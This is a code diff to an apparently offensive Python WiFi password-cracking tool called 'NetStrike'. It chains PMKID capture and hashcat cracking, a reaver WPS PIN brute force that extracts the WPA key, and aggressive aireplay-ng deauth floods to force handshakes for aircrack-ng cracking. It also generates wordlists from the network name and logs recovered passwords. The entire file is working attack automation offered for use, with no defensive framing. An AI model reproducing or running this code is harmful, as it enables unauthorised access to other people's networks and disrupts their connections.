@@ -13,7 +13,7 @@ class PasswordCracker:
         self.cracking_active = False
 
     def auto_crack_attack(self):
-        """Professional Auto Cracking - Multiple Methods"""
+        """Professional Auto Cracking - CASCADE ENGINE"""
         print("\033[1;36m[→] Starting professional cracking protocol...\033[0m")
         
         # Always fresh scan
@@ -23,52 +23,51 @@ class PasswordCracker:
             
             if target:
                 print(f"\033[1;33m[🎯] Target: {target['essid']}\033[0m")
-                print("\033[1;36m[⚡] Professional cracking sequence initiated...\033[0m")
+                print("\033[1;36m[⚡] Professional cascade sequence initiated...\033[0m")
                 
-                # Professional method sequence
-                if self.professional_cracking_sequence(target):
+                # Professional cascade sequence
+                if self.professional_cascade_sequence(target):
                     return
                 
                 print("\033[1;31m[✘] All professional methods exhausted\033[0m")
 
-    def professional_cracking_sequence(self, target):
-        """Professional cracking method sequence"""
-        methods = [
-            ("PMKID Capture", self.professional_pmkid_attack),
-            ("WPS Assessment", self.professional_wps_assessment),
-            ("Handshake Capture", self.professional_handshake_capture),
-            ("Advanced Dictionary", self.professional_dictionary_attack)
-        ]
+    def professional_cascade_sequence(self, target):
+        """Professional CASCADE cracking sequence"""
+        print("\033[1;36m[🔄] Starting cascade attack sequence...\033[0m")
         
-        for method_name, method_func in methods:
-            print(f"\033[1;36m[→] Professional method: {method_name}\033[0m")
-            
-            result = method_func(target)
-            
-            if result:
-                print(f"\033[1;32m[🎉] Success with {method_name}!\033[0m")
-                return True
-            else:
-                print(f"\033[1;33m[⚠️] {method_name} incomplete\033[0m")
-                time.sleep(2)
+        # STEP 1: PMKID Attack (Stealth)
+        print("\033[1;36m[1️⃣] STEP 1: PMKID Capture (Client-less)\033[0m")
+        if self.professional_pmkid_attack(target):
+            return True
+        
+        # STEP 2: WPS Assessment
+        print("\033[1;36m[2️⃣] STEP 2: WPS Vulnerability Assessment\033[0m")
+        if self.professional_wps_assessment(target):
+            return True
+        
+        # STEP 3: Handshake Capture + Brute Force
+        print("\033[1;36m[3️⃣] STEP 3: Handshake Capture & Brute Force\033[0m")
+        if self.professional_handshake_bruteforce(target):
+            return True
         
         return False
 
     def professional_pmkid_attack(self, target):
-        """Professional PMKID attack"""
+        """Professional PMKID attack - STEP 1"""
         print("\033[1;33m[!] Attempting professional PMKID capture...\033[0m")
         
         pmkid_file = f"/tmp/netstrike_pmkid_{target['bssid'].replace(':', '')}"
         
         # Professional PMKID capture
-        capture_cmd = f"timeout 30 hcxdumptool -i {self.core.mon_interface} -o {pmkid_file}.pcapng --filterlist={target['bssid']} --filtermode=2 --enable_status=1"
+        print("\033[1;36m[→] Capturing PMKID (60 seconds)...\033[0m")
+        capture_cmd = f"timeout 60 hcxdumptool -i {self.core.mon_interface} -o {pmkid_file}.pcapng --filterlist={target['bssid']} --filtermode=2 --enable_status=1 > /dev/null 2>&1"
         result = self.core.run_command(capture_cmd)
         
         if os.path.exists(f"{pmkid_file}.pcapng") and os.path.getsize(f"{pmkid_file}.pcapng") > 100:
             print("\033[1;32m[✓] PMKID captured professionally\033[0m")
             
             # Convert to hash format
-            convert_cmd = f"hcxpcaptool -z {pmkid_file}.hash {pmkid_file}.pcapng"
+            convert_cmd = f"hcxpcaptool -z {pmkid_file}.hash {pmkid_file}.pcapng > /dev/null 2>&1"
             self.core.run_command(convert_cmd)
             
             if os.path.exists(f"{pmkid_file}.hash"):
@@ -79,70 +78,95 @@ class PasswordCracker:
 
     def professional_crack_pmkid(self, hash_file, target):
         """Professional PMKID cracking"""
-        wordlist = self.get_professional_wordlist()
+        wordlists = self.get_professional_wordlists()
         
-        if wordlist:
-            print("\033[1;36m[→] Professional PMKID cracking...\033[0m")
-            
-            crack_cmd = f"hashcat -m 16800 {hash_file} {wordlist} -O --force -w 3"
-            result = self.core.run_command(crack_cmd, timeout=300)
-            
-            if result and "Cracked" in result.stdout:
-                print("\033[1;32m[🎉] PMKID cracked successfully!\033[0m")
-                lines = result.stdout.split('\n')
-                for line in lines:
-                    if "Cracked" in line and ":" in line:
-                        password = line.split(':')[-1].strip()
-                        print(f"\033[1;32m[🔓] PASSWORD: {password}\033[0m")
-                        self.save_cracked_password(target, password)
-                        return True
+        for wl_name, wl_path in wordlists.items():
+            if wl_path and os.path.exists(wl_path):
+                print(f"\033[1;36m[→] PMKID cracking with {wl_name}...\033[0m")
+                
+                crack_cmd = f"hashcat -m 16800 {hash_file} {wl_path} -O --force -w 3"
+                result = self.core.run_command(crack_cmd, timeout=300)
+                
+                if result and "Cracked" in result.stdout:
+                    print("\033[1;32m[🎉] PMKID cracked successfully!\033[0m")
+                    lines = result.stdout.split('\n')
+                    for line in lines:
+                        if "Cracked" in line and ":" in line:
+                            password = line.split(':')[-1].strip()
+                            print(f"\033[1;32m[🔓] PASSWORD: {password}\033[0m")
+                            self.save_cracked_password(target, password)
+                            return True
         
         return False
 
     def professional_wps_assessment(self, target):
-        """Professional WPS assessment"""
+        """Professional WPS assessment - STEP 2"""
         print("\033[1;33m[!] Professional WPS vulnerability assessment...\033[0m")
         
-        wash_cmd = f"timeout 20 wash -i {self.core.mon_interface} -s -C"
+        wash_cmd = f"timeout 30 wash -i {self.core.mon_interface} -s -C"
         result = self.core.run_command(wash_cmd)
         
         if result and target['bssid'] in result.stdout:
             print("\033[1;32m[✓] WPS vulnerability detected\033[0m")
             print("\033[1;31m[💣] Launching professional WPS attack...\033[0m")
             
-            # Professional WPS attack
+            # Professional WPS attack with reaver
             reaver_proc = self.core.run_command(
-                f"reaver -i {self.core.mon_interface} -b {target['bssid']} -c {target['channel']} -vv -K 1 -N -A -d 2",
+                f"reaver -i {self.core.mon_interface} -b {target['bssid']} -c {target['channel']} -vv -K 1 -N -A -d 2 > /tmp/reaver_attack.log 2>&1 &",
                 background=True
             )
             
             if reaver_proc:
-                print("\033[1;32m[⚡] Professional WPS attack running\033[0m")
-                return True
+                print("\033[1;32m[⚡] Professional WPS attack running (5 minutes)\033[0m")
+                
+                # Monitor for 5 minutes
+                start_time = time.time()
+                while time.time() - start_time < 300:
+                    if os.path.exists("/tmp/reaver_attack.log"):
+                        with open("/tmp/reaver_attack.log", "r") as f:
+                            content = f.read()
+                            if "WPS PIN:" in content:
+                                print("\033[1;32m[🎉] WPS PIN found!\033[0m")
+                                # Extract PIN and password
+                                lines = content.split('\n')
+                                for line in lines:
+                                    if "WPS PIN:" in line:
+                                        pin = line.split("WPS PIN:")[1].strip()
+                                        print(f"\033[1;32m[🔑] WPS PIN: {pin}\033[0m")
+                                    if "WPA PSK:" in line:
+                                        password = line.split("WPA PSK:")[1].strip()
+                                        print(f"\033[1;32m[🔓] PASSWORD: {password}\033[0m")
+                                        self.save_cracked_password(target, password)
+                                        reaver_proc.terminate()
+                                        return True
+                    time.sleep(5)
+                
+                reaver_proc.terminate()
+                print("\033[1;33m[⚠️] WPS attack timeout\033[0m")
         else:
             print("\033[1;31m[✘] WPS not available\033[0m")
         
         return False
 
-    def professional_handshake_capture(self, target):
-        """Professional handshake capture with targeted deauth"""
-        print("\033[1;33m[!] Professional handshake capture...\033[0m")
+    def professional_handshake_bruteforce(self, target):
+        """Professional handshake capture + brute force - STEP 3"""
+        print("\033[1;33m[!] Professional handshake capture & brute force...\033[0m")
         
-        cap_file = f"/tmp/netstrike_handshake_{target['bssid'].replace(':', '_')}"
+        handshake_file = f"/tmp/netstrike_handshake_{target['bssid'].replace(':', '_')}"
         
         # Set channel
         self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
         
         # Start professional capture
-        print("\033[1;36m[→] Professional capture for 60 seconds...\033[0m")
+        print("\033[1;36m[→] Professional handshake capture (60 seconds)...\033[0m")
         capture_proc = self.core.run_command(
-            f"airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {cap_file} {self.core.mon_interface}",
+            f"airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {handshake_file} {self.core.mon_interface} > /dev/null 2>&1 &",
             background=True
         )
         
-        # Professional targeted deauth
-        print("\033[1;31m[💣] Professional targeted deauth...\033[0m")
-        deauth_thread = threading.Thread(target=self.professional_targeted_deauth, args=(target,))
+        # Aggressive deauth to force handshake
+        print("\033[1;31m[💣] Aggressive deauth to force handshake...\033[0m")
+        deauth_thread = threading.Thread(target=self.aggressive_deauth_attack, args=(target,))
         deauth_thread.daemon = True
         deauth_thread.start()
         
@@ -150,7 +174,7 @@ class PasswordCracker:
         handshake_captured = False
         start_time = time.time()
         while time.time() - start_time < 60 and not handshake_captured:
-            if self.check_professional_handshake(f"{cap_file}-01.cap"):
+            if self.check_professional_handshake(f"{handshake_file}-01.cap", target['bssid']):
                 handshake_captured = True
                 break
             time.sleep(5)
@@ -160,50 +184,32 @@ class PasswordCracker:
         
         if handshake_captured:
             print("\033[1;32m[✓] Professional handshake captured!\033[0m")
-            return self.professional_crack_handshake(f"{cap_file}-01.cap", target['bssid'], target['essid'])
+            return self.professional_bruteforce_attack(f"{handshake_file}-01.cap", target)
         else:
             print("\033[1;31m[✘] Handshake capture failed\033[0m")
             return False
 
-    def professional_targeted_deauth(self, target):
-        """Professional targeted deauth attack"""
-        # Get specific clients for targeted deauth
-        target_clients = [c for c, info in self.scanner.clients.items() if info.get('bssid') == target['bssid']]
-        
-        if target_clients:
-            print(f"\033[1;31m[⚡] Targeting {len(target_clients)} specific clients\033[0m")
-            for i in range(15):
-                for client_mac in target_clients:
-                    if self.cracking_active:
-                        break
-                    self.core.run_command(f"aireplay-ng --deauth 5 -a {target['bssid']} -c {client_mac} {self.core.mon_interface} >/dev/null 2>&1")
-                    time.sleep(1)
-        else:
-            # Fallback to broadcast
-            print("\033[1;33m[!] No clients found, using broadcast deauth\033[0m")
-            for i in range(15):
-                self.core.run_command(f"aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface} >/dev/null 2>&1")
-                time.sleep(2)
+    def aggressive_deauth_attack(self, target):
+        """Aggressive deauth to force handshake"""
+        for i in range(20):  # 20 attempts
+            if self.cracking_active:
+                break
+            self.core.run_command(f"aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface} > /dev/null 2>&1")
+            time.sleep(3)
 
-    def professional_dictionary_attack(self, target):
-        """Professional dictionary attack"""
-        print("\033[1;33m[!] Professional dictionary attack...\033[0m")
+    def professional_bruteforce_attack(self, cap_file, target):
+        """Professional brute force attack with multiple wordlists"""
+        print("\033[1;36m[→] Starting professional brute force attack...\033[0m")
         
-        wordlists = self.get_professional_wordlists()
+        wordlists = self.get_professional_wordlists_priority(target['essid'])
         
-        # Check for existing handshake
-        cap_file = f"/tmp/netstrike_handshake_{target['bssid'].replace(':', '_')}-01.cap"
-        if not os.path.exists(cap_file):
-            print("\033[1;31m[✘] No handshake file found\033[0m")
-            return False
-        
-        for wordlist_name, wordlist_path in wordlists.items():
-            if wordlist_path and os.path.exists(wordlist_path):
-                print(f"\033[1;36m[→] Professional wordlist: {wordlist_name}\033[0m")
+        for wl_name, wl_path in wordlists.items():
+            if wl_path and os.path.exists(wl_path):
+                print(f"\033[1;36m[→] Attempting: {wl_name}\033[0m")
                 
                 result = self.core.run_command(
-                    f"aircrack-ng -w {wordlist_path} -b {target['bssid']} {cap_file} -l /tmp/cracked.txt -q",
-                    timeout=300
+                    f"aircrack-ng -w {wl_path} -b {target['bssid']} {cap_file} -l /tmp/cracked.txt -q",
+                    timeout=600
                 )
                 
                 if os.path.exists("/tmp/cracked.txt"):
@@ -212,52 +218,35 @@ class PasswordCracker:
                     print(f"\033[1;32m[🎉] PASSWORD CRACKED: {password}\033[0m")
                     self.save_cracked_password(target, password)
                     return True
+                elif result and "KEY FOUND" in result.stdout:
+                    # Extract password from aircrack output
+                    lines = result.stdout.split('\n')
+                    for line in lines:
+                        if "KEY FOUND" in line:
+                            password = line.split('[')[1].split(']')[0]
+                            print(f"\033[1;32m[🎉] PASSWORD: {password}\033[0m")
+                            self.save_cracked_password(target, password)
+                            return True
         
         return False
 
-    def check_professional_handshake(self, cap_file):
-        """Professional handshake verification"""
-        if not os.path.exists(cap_file):
-            return False
+    def get_professional_wordlists_priority(self, essid):
+        """Get wordlists in priority order"""
+        intelligent_wl = self.create_intelligent_wordlist(essid)
+        professional_wl = self.get_professional_wordlist()
+        rockyou_wl = self.get_rockyou_wordlist()
+        common_wl = self.get_common_wordlist()
         
-        result = self.core.run_command(f"aircrack-ng {cap_file} 2>/dev/null | grep '1 handshake'")
-        return result and "1 handshake" in result.stdout
+        return {
+            "Intelligent Wordlist": intelligent_wl,
+            "Professional Wordlist": professional_wl,
+            "RockYou": rockyou_wl,
+            "Common Passwords": common_wl
+        }
 
-    def professional_crack_handshake(self, cap_file, bssid, essid):
-        """Professional handshake cracking"""
-        print("\033[1;33m[!] Professional handshake cracking...\033[0m")
-        
-        # Create intelligent wordlist first
-        smart_wordlist = self.create_professional_wordlist(essid)
-        
-        wordlist_priority = [
-            ("Intelligent Wordlist", smart_wordlist),
-            ("Professional Wordlist", self.get_professional_wordlist()),
-            ("RockYou", self.get_rockyou_wordlist()),
-            ("Common Passwords", self.get_common_wordlist())
-        ]
-        
-        for wl_name, wl_path in wordlist_priority:
-            if wl_path and os.path.exists(wl_path):
-                print(f"\033[1;36m[→] Professional attempt: {wl_name}\033[0m")
-                
-                result = self.core.run_command(
-                    f"aircrack-ng -w {wl_path} -b {bssid} {cap_file} -l /tmp/cracked.txt -q",
-                    timeout=600
-                )
-                
-                if os.path.exists("/tmp/cracked.txt"):
-                    with open("/tmp/cracked.txt", 'r') as f:
-                        password = f.read().strip()
-                    print(f"\033[1;32m[🎉] PASSWORD: {password}\033[0m")
-                    self.save_cracked_password({'essid': essid, 'bssid': bssid}, password)
-                    return True
-        
-        return False
-
-    def create_professional_wordlist(self, essid):
-        """Create professional targeted wordlist"""
-        wordlist_path = "/tmp/netstrike_pro_wordlist.txt"
+    def create_intelligent_wordlist(self, essid):
+        """Create intelligent targeted wordlist"""
+        wordlist_path = "/tmp/netstrike_intelligent_wordlist.txt"
         
         common_passwords = [
             "12345678", "password", "admin123", "welcome", "qwerty", "letmein",
@@ -273,7 +262,8 @@ class PasswordCracker:
             variations = [
                 essid, essid + "123", essid + "1234", essid + "12345", essid + "2024",
                 essid.lower(), essid.upper(), clean_essid, clean_essid + "123",
-                essid.replace(' ', ''), essid.replace(' ', '_'), essid.replace(' ', '-')
+                essid.replace(' ', ''), essid.replace(' ', '_'), essid.replace(' ', '-'),
+                essid + "!", essid + "@", essid + "#", essid + "$"
             ]
             
             common_passwords.extend(variations)
@@ -291,8 +281,9 @@ class PasswordCracker:
             return None
 
     def get_professional_wordlists(self):
-        """Get professional wordlists"""
+        """Get all available wordlists"""
         return {
+            "Intelligent": self.create_intelligent_wordlist(""),
             "Professional": self.get_professional_wordlist(),
             "RockYou": self.get_rockyou_wordlist(),
             "Common": self.get_common_wordlist()
@@ -308,7 +299,8 @@ class PasswordCracker:
                 "123456", "password", "12345678", "qwerty", "123456789",
                 "12345", "1234", "111111", "1234567", "dragon",
                 "123123", "baseball", "abc123", "football", "monkey",
-                "letmein", "696969", "shadow", "master", "666666"
+                "letmein", "696969", "shadow", "master", "666666",
+                "1234567890", "superman", "654321", "1qaz2wsx", "7777777"
             ]
             
             try:
@@ -322,46 +314,75 @@ class PasswordCracker:
 
     def get_rockyou_wordlist(self):
         """Get rockyou wordlist"""
-        rockyou_path = "/usr/share/wordlists/rockyou.txt"
+        rockyou_paths = [
+            "/usr/share/wordlists/rockyou.txt",
+            "/usr/share/wordlists/rockyou.txt.gz", 
+            "/tmp/rockyou.txt"
+        ]
         
-        if os.path.exists(rockyou_path):
-            return rockyou_path
+        for path in rockyou_paths:
+            if os.path.exists(path):
+                if path.endswith('.gz'):
+                    # Extract if gzipped
+                    self.core.run_command(f"gzip -dc {path} > /tmp/rockyou.txt 2>/dev/null")
+                    return "/tmp/rockyou.txt"
+                return path
         
-        # Try to download
-        self.core.run_command("wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O /tmp/rockyou.txt 2>/dev/null")
-        
-        if os.path.exists("/tmp/rockyou.txt"):
-            return "/tmp/rockyou.txt"
-        
-        return None
+        # Try to create a basic one
+        self.create_basic_wordlist()
+        return "/tmp/common_passwords.txt"
 
     def get_common_wordlist(self):
         """Get common password wordlist"""
         common_path = "/tmp/common_passwords.txt"
         
         if not os.path.exists(common_path):
-            common_passwords = [
-                "123456", "password", "12345678", "qwerty", "123456789",
-                "12345", "1234", "111111", "1234567", "dragon"
-            ]
-            
-            try:
-                with open(common_path, 'w') as f:
-                    for pwd in common_passwords:
-                        f.write(pwd + '\n')
-            except:
-                pass
+            self.create_basic_wordlist()
         
         return common_path
+
+    def create_basic_wordlist(self):
+        """Create basic wordlist"""
+        common_passwords = [
+            "123456", "password", "12345678", "qwerty", "123456789",
+            "12345", "1234", "111111", "1234567", "dragon", "123123"
+        ]
+        
+        try:
+            with open("/tmp/common_passwords.txt", 'w') as f:
+                for pwd in common_passwords:
+                    f.write(pwd + '\n')
+        except:
+            pass
+
+    def check_professional_handshake(self, cap_file, bssid):
+        """Professional handshake verification"""
+        if not os.path.exists(cap_file):
+            return False
+        
+        result = self.core.run_command(f"aircrack-ng {cap_file} 2>/dev/null | grep '{bssid}'")
+        return result and "1 handshake" in result.stdout
 
     def save_cracked_password(self, target, password):
         """Save cracked password professionally"""
         try:
             with open("/tmp/netstrike_cracked.txt", "a") as f:
-                f.write(f"Network: {target['essid']} | Password: {password}\n")
+                f.write(f"Network: {target['essid']} | BSSID: {target['bssid']} | Password: {password}\n")
             print(f"\033[1;32m[💾] Password saved to: /tmp/netstrike_cracked.txt\033[0m")
         except:
             pass
+
+    def handshake_capture_menu(self):
+        """Handshake capture menu"""
+        print("\033[1;36m[→] Starting handshake capture protocol...\033[0m")
+        
+        if self.scanner.wifi_scan():
+            self.scanner.display_scan_results()
+            target = self.scanner.select_target()
+            
+            if target:
+                print(f"\033[1;33m[🎯] Target: {target['essid']}\033[0m")
+                self.professional_handshake_bruteforce(target)
 
     def wps_pin_attack(self):
         """Professional WPS PIN attack"""
@@ -381,10 +402,11 @@ class PasswordCracker:
             print("\033[1;31m[💣] Professional WPS attack...\033[0m")
             
             self.core.run_command(
-                f"reaver -i {self.core.mon_interface} -b {target_bssid} -c {target_channel} -vv -K 1 -N -A",
+                f"reaver -i {self.core.mon_interface} -b {target_bssid} -c {target_channel} -vv -K 1 -N -A > /tmp/reaver_attack.log 2>&1 &",
                 background=True
             )
             
             print("\033[1;32m[✅] Professional WPS attack deployed\033[0m")
+            print("\033[1;33m[📋] Monitoring /tmp/reaver_attack.log for results...\033[0m")
         else:
             print("\033[1;31m[✘] Invalid target data\033[0m")
